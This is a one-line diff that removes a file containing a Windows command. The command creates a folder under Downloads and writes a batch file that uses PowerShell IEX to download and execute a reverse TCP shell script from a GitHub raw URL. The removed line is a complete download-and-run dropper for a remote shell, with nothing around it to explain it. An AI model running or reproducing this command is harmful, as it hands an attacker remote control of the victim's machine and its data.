@@ -1,1 +1,0 @@
-md C:\Users\User\Downloads\ser; echo IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/prompt/minified/powershell_reverse_tcp_prompt_mini.ps1').GetResponse().GetResponseStream()).ReadToEnd()); >C:\Users\User\Downloads\serseruseruex.bat;
